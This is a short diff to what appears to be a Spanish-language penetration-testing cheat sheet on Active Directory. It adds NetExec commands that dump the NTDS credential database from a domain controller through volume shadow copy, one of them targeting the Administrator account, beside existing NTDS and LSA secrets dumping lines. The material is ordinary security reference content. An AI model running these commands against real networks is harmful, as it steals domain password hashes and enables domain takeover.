@@ -547,6 +547,8 @@ Jerarquía de preferencia para ejecución remota:
 # LSA secrets — a veces tiene creds en claro de servicios
 
 ❯ nxc smb <IP> -u 'user' -p 'pass' --ntds
+❯ nxc smb <IP> -u 'user' -p 'pass' --ntds vss 
+❯ nxc smb <IP> -u 'user' -p 'pass' --ntds vss --user Administrator
 # Dump de NTDS → requiere privilegios AD altos
 
 ❯ nxc smb <IP> -u 'user' -H 'hash' --ntds
